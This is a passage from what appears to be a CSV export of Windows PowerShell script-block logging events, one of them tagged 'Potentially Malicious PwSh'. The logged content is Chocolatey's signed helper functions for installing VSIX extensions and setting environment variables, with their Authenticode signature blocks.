of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyVsixPackage { <# .SYNOPSIS Downloads and installs a VSIX package for Visual Studio .DESCRIPTION VSIX packages are Extensions for the Visual Studio IDE. The Visual Studio Gallery at http://visualstudiogallery.msdn.microsoft.com/ is the public extension feed and hosts thousands of extensions. You can locate a VSIX Url by finding the download link of Visual Studio extensions on the Visual Studio Gallery. .NOTES Chocolatey works best when the packages contain the software it is managing and doesn't require downloads. However most software in the Windows world requires redistribution rights and when sharing packages publicly (like on the community feed), maintainers may not have those aforementioned rights. Chocolatey understands how to work with that, hence this function. You are not subject to this limitation with internal packages. .INPUTS None .OUTPUTS None .PARAMETER PackageName The name of the package - while this is an arbitrary value, it's recommended that it matches the package id. In 0.10.4+, `Name` is an alias for PackageName. .PARAMETER VsixUrl The URL of the package to be installed. Prefer HTTPS when available. Can be HTTP, FTP, or File URIs. In 0.10.4+, `Url` is an alias for VsixUrl. .PARAMETER VsVersion The major version number of Visual Studio where the package should be installed. This is optional. If not specified, the most recent Visual Studio installation will be targetted. NOTE: For Visual Studio 2015, the VsVersion is 14. It can be determined by looking at the folders under Program Files / Program Files (x86). In 0.10.4+, `VisualStudioVersion` is an alias for VsVersion. .PARAMETER Checksum The checksum hash value of the Url resource. This allows a checksum to be validated for files that are not local. The checksum type is covered by ChecksumType. **NOTE:** Checksums in packages are meant as a measure to validate the originally intended file that was used in the creation of a package is the same file that is received at a future date. Since this is used for other steps in the process related to the community repository, it ensures that the file a user receives is the same file a maintainer and a moderator (if applicable), plus any moderation review has intended for you to receive with this package. If you are looking at a remote source that uses the same url for updates, you will need to ensure the package also stays updated in line with those remote resource updates. You should look into [automatic packaging](https://chocolatey.org/docs/automatic-packages) to help provide that functionality. **NOTE:** To determine checksums, you can get that from the original site if provided. You can also use the [checksum tool available on the community feed](https://chocolatey.org/packages/checksum) (`choco install checksum`) and use it e.g. `checksum -t sha256 -f path\to\file`. Ensure you provide checksums for all remote resources used. .PARAMETER ChecksumType The type of checkum that the file is validated with - valid values are 'md5', 'sha1', 'sha256' or 'sha512' - defaults to 'md5'. MD5 is not recommended as certain organizations need to use FIPS compliant algorithms for hashing - see https://support.microsoft.com/en-us/kb/811833 for more details. The recommendation is to use at least SHA256. .PARAMETER Options OPTIONAL - Specify custom headers. Available in 0.9.10+. .PARAMETER File Will be used for VsixUrl if VsixUrl is empty. Available in 0.10.7+. This parameter provides compatibility, but should not be used directly and not with the community package repository until January 2018. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to the latest version of VS. Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to Visual Studio 2012 (v11.0). Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix ` -VsVersion 11 .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Install-ChocolateyZipPackage #> param( [alias(""name"")][parameter(Mandatory=$true, Position=0)][string] $packageName, [alias(""url"")][parameter(Mandatory=$false, Position=1)][string] $vsixUrl, [alias(""visualStudioVersion"")][parameter(Mandatory=$false, Position=2)][int] $vsVersion = 0, [parameter(Mandatory=$false)][string] $checksum = '', [parameter(Mandatory=$false)][string] $checksumType = '', [parameter(Mandatory=$false)][hashtable] $options = @{Headers=@{}}, [alias(""fileFullPath"")][parameter(Mandatory=$false)][string] $file = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($vsixUrl -eq '' -or $vsixUrl -eq $null) { $vsixUrl = $file } if($vsVersion -eq 0) { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } else { $versions=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } if($versions -and $versions.Length){ $version = $versions[0] }elseif($versions){ $version = $versions } } else { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } else { $version=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } } if ($version) { $vnum=$version.PSPath.Substring($version.PSPath.LastIndexOf('\')+1) if($vnum -as [int] -lt 10) { throw ""This installed VS version, $vnum, does not support installing VSIX packages. Version 10 is the minimum acceptable version."" } $dir=(get-itemProperty $version.PSPath ""InstallDir"").InstallDir $installer = Join-Path $dir ""VsixInstaller.exe"" } if ($installer) { $download=""$env:TEMP\$($packageName.Replace(' ','')).vsix"" try{ Get-ChocolateyWebFile $packageName $download $vsixUrl -checksum $checksum -checksumType $checksumType -Options $options } catch { throw ""There were errors attempting to retrieve the vsix from $vsixUrl. The error message was '$_'."" } Write-Debug ""Installing VSIX using $installer"" $exitCode = Install-Vsix ""$installer"" ""$download"" if($exitCode -gt 0 -and $exitCode -ne 1001) { #1001: Already installed throw ""There was an error installing '$packageName'. The exit code returned was $exitCode."" } } else { throw ""Visual Studio is not installed or the specified version is not present."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwvbwbcXwGHARv # s0aL6zHGEwZUxYCbjjh5ZcXDMGFCc6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgY21LEp9apuTMLqguzypSjDhrQ2TRe8edZGc6 # /Wjr8LIwDQYJKoZIhvcNAQEBBQAEggEAVqid4PiRvy3Rz95AXsqvb7v8clOSDutY # mBU2Njes3J1iOx+jQbU5SD02i04upCKFeaeNN9FfzidZa4Q88uoeirKsKi0UGrjr # BnUIzamzRNRO7w3LLz4ctku8eFoEsNtkclcXy6HW3cubvQ9UUmznObLjlWY42hvl # /vVvzRJYkQyC3LlO5ny2obm6e7ZjiCRSNpasr9SAfoudEhmU/O3nAtayW3KstSwX # 6YGEEdcYKiK9PuPYg4PgPP7tgQMNhN4hQkM4pwL2DvGPDO0Z9TKJpm/uaANdw7Fc # WlJL1zMlIuOtVrHtVX7emS1O+9k7eSaGPbo+SYHmjbUXGQXS/U0/SaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQU40gRxQX/DFfRvsp9 # uY236RUSX6swDQYJKoZIhvcNAQEBBQAEggEAdNctgo5xpF4Yvn6HDB1eWkeD2J7v # Ac6OQH2uoibswWMoa5QyXi4xmc8g4WULeNS32RyBeFWIicGr7We77EffVS6wvC2n # jjxXHuq1Lid5gxE7GgKs54GONcDbWCK7sWJ00qmkP7qrWMp5IrQxpNwgCuMTNBeL # ijKPb9xC3QnbiY9DOFoc5dc6fvFNAj93MqWi1tZUG524Fk+anAAYmExlUxDUmMPW # y8H2MnE9UtQFNSClb8KRZY9gkcpuOrR3dZsCU9deoW4qt8Y9zZ6SnjibCfHbuslP # EJ42K0/lJvs/KZRRjhscT8dOo732rd96hqXJjR9x6YnHdEEODbRXSxSHyA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:32.692 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,64,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # 